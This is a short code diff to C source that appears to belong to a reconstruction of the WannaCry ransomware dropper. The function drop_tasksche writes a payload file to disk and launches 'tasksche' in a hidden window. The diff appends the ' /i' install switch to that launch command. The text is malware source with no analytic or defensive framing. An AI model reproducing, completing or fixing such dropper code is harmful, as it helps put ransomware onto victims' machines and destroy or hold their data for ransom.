@@ -84,7 +84,8 @@ int drop_tasksche()
         WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesWritten, 0);
         CloseHandle(hFile);
     }
-    
+    //add the /i parameter to the end of tasksche
+    strcat(szPath, " /i");
     //run tasksche with /i parameters
     if(CreateProcessA(NULL, szPath, 0, 0, 0, 0x8000000, 0, 0, &pi, &si))
     {
